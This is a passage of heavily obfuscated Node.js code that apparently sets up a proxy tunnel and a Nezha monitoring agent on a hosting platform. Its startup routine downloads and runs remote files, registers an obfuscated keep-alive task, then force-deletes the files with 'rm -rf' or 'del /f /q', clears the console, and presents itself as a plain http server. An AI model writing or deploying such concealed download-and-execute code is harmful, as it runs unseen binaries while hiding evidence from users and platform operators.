NEZHA_SERVER&&NEZHA_KEY&&_0x15884a[_0x11b9eb(0xed)](phpPath);process['platform']===_0x11b9eb(0x130)?exec('del\x20/f\x20/q\x20'+_0x15884a[_0x11b9eb(0xa5)]('\x20')+'\x20>\x20nul\x202>&1',_0x2ed88b=>{const _0x3cd499=_0x11b9eb;console[_0x3cd499(0x143)](),console[_0x3cd499(0xf1)](_0x3cd499(0xd2)),console[_0x3cd499(0xf1)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x15884a[_0x11b9eb(0xa5)]('\x20')+_0x11b9eb(0x13b),_0x12526b=>{const _0x27ac60=_0x11b9eb;console['clear'](),console[_0x27ac60(0xf1)]('App\x20is\x20running'),console[_0x27ac60(0xf1)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4436f7=_0xfa4567;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x33bab5=await axios['post'](_0x4436f7(0x107),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4436f7(0xfa)}});return console['log'](_0x4436f7(0x14c)),_0x33bab5;}catch(_0x2e1a0d){return console[_0x4436f7(0x13d)](_0x4436f7(0xb9)+_0x2e1a0d[_0x4436f7(0xb3)]),null;}}async function startserver(){const _0xdb5d0c=_0xfa4567;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x335173){console[_0xdb5d0c(0x13d)](_0xdb5d0c(0xc5),_0x335173);}}startserver()[_0xfa4567(0x12a)](_0x5ea867=>{const _0x2b17c1=_0xfa4567;console[_0x2b17c1(0x13d)](_0x2b17c1(0xfe),_0x5ea867);}),app['listen'](PORT,()=>console[_0xfa4567(0xf1)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
